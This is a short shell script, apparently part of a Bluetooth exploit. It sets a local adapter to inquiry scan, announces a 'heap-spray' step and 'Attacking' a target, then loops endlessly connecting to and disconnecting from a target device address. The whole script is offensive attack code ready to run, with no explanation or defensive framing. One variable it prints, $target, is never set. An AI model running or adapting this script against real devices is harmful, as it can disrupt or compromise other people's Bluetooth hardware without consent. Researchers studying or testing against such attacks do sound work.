systemctl restart bluetooth.service
hciconfig $1 up
hciconfig $1 iscan

echo "Inquiry Scan running, hit return to run heap-spray"
read
hciconfig $1 noscan

echo "Attacking $target"
while [ 1 -eq 1 ]
do
    echo "connect" $1
    hcitool -i $1 cc $2
    echo "disconnect" $1
    hcitool -i $1 dc $2
done

